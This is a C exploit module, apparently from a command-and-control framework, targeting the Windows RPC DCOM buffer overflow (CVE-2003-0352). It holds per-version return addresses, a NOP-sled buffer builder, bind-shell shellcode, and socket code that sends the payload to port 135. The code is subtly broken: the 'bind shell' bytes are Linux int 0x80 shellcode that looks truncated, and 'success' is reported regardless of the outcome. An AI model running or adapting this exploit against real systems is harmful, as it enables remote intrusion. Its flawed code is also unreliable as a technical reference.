/*
 * Cardinal C2 Framework - MS03-026 Exploit Module
 * CVE-2003-0352 - Windows RPC DCOM Buffer Overflow
 * Target: Windows 2000, Windows XP, Windows Server 2003
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define TARGET_PORT 135
#define SHELLCODE_SIZE 512

// Simple bind shell shellcode placeholder
unsigned char bindshell[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x31\xdb\x53\x43\x53\x43\x53\x89\xe1\x6a\x66\x58\xcd\x80\x50\x68"
    "\xff\x02\x11\x5c\x89\xe1\x6a\x10\x51\x50\xb0\x66\xb3\x02\x89\xe1"
    "\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1"
    "\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0";

typedef struct {
    const char* name;
    unsigned long ret_addr;
    int offset;
} Target;

Target targets[] = {
    {"Windows 2000 SP0", 0x77e5c1c3, 72},
    {"Windows 2000 SP4", 0x750362c3, 72},
    {"Windows XP SP0", 0x77e6c1c3, 68},
    {"Windows XP SP1", 0x77e77c1c, 68},
    {"Windows Server 2003", 0x77f432c3, 64}
};

void print_banner() {
    printf("\n");
    printf("Cardinal C2 - MS03-026 Exploit Module\n");
    printf("CVE-2003-0352 - RPC DCOM Buffer Overflow\n");
    printf("For Authorized Penetration Testing Only\n");
    printf("\n");
}

unsigned char* build_dcom_request(Target* target, size_t* out_size) {
    unsigned char dcom_header[] = 
        "\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
        "\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
        "\xc4\xfe\xfc\x99\x60\x52\x1b\x10\xbb\xcb\x00\xaa\x00\x21\x34\x7a"
        "\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
        "\x2b\x10\x48\x60\x02\x00\x00\x00";
    
    size_t header_size = sizeof(dcom_header) - 1;
    size_t total_size = header_size + target->offset + 4 + sizeof(bindshell) - 1;
    
    unsigned char* buffer = (unsigned char*)malloc(total_size + 256);
    if (!buffer) return NULL;
    
    int pos = 0;
    
    // Add DCOM header
    memcpy(buffer + pos, dcom_header, header_size);
    pos += header_size;
    
    // Add NOP sled
    memset(buffer + pos, 0x90, target->offset);
    pos += target->offset;
    
    // Add return address
    *(unsigned long*)(buffer + pos) = target->ret_addr;
    pos += 4;
    
    // Add shellcode
    memcpy(buffer + pos, bindshell, sizeof(bindshell) - 1);
    pos += sizeof(bindshell) - 1;
    
    // Add padding
    memset(buffer + pos, 0x41, 100);
    pos += 100;
    
    *out_size = pos;
    return buffer;
}

BOOL exploit_ms03026(const char* target_ip, int target_idx) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    unsigned char* exploit_buffer;
    size_t exploit_size;
    
    if (target_idx < 0 || target_idx >= sizeof(targets) / sizeof(Target)) {
        printf("[!] Invalid target index\n");
        return FALSE;
    }
    
    Target* target = &targets[target_idx];
    
    printf("[*] Target: %s\n", target->name);
    printf("[*] Return address: 0x%08lx\n", target->ret_addr);
    printf("[*] Buffer offset: %d\n", target->offset);
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] WSAStartup failed\n");
        return FALSE;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("[!] Socket creation failed\n");
        WSACleanup();
        return FALSE;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(TARGET_PORT);
    server.sin_addr.s_addr = inet_addr(target_ip);
    
    printf("[*] Connecting to %s:%d...\n", target_ip, TARGET_PORT);
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("[!] Connection failed\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Connected\n");
    printf("[*] Building exploit buffer...\n");
    
    exploit_buffer = build_dcom_request(target, &exploit_size);
    if (!exploit_buffer) {
        printf("[!] Failed to build exploit buffer\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[*] Exploit size: %zu bytes\n", exploit_size);
    printf("[*] Sending exploit...\n");
    
    int sent = send(sock, (char*)exploit_buffer, exploit_size, 0);
    if (sent < 0) {
        printf("[!] Send failed\n");
        free(exploit_buffer);
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Sent %d bytes\n", sent);
    
    // Wait for response
    unsigned char response[1024];
    int received = recv(sock, (char*)response, sizeof(response), 0);
    if (received > 0) {
        printf("[+] Received %d bytes response\n", received);
    }
    
    free(exploit_buffer);
    closesocket(sock);
    WSACleanup();
    
    printf("[+] Exploit completed\n");
    return TRUE;
}

int main(int argc, char* argv[]) {
    print_banner();
    
    if (argc < 3) {
        printf("Usage: %s <target_ip> <target_type>\n\n", argv[0]);
        printf("Target types:\n");
        for (int i = 0; i < sizeof(targets) / sizeof(Target); i++) {
            printf("  %d - %s\n", i, targets[i].name);
        }
        printf("\n");
        return 1;
    }
    
    const char* target_ip = argv[1];
    int target_type = atoi(argv[2]);
    
    printf("[*] Starting MS03-026 exploit\n");
    printf("[*] Target: %s\n", target_ip);
    
    if (exploit_ms03026(target_ip, target_type)) {
        printf("\n[+] Exploit successful\n");
        printf("[*] Shell should be listening on port 4444\n");
        return 0;
    } else {
        printf("\n[!] Exploit failed\n");
        return 1;
    }
}
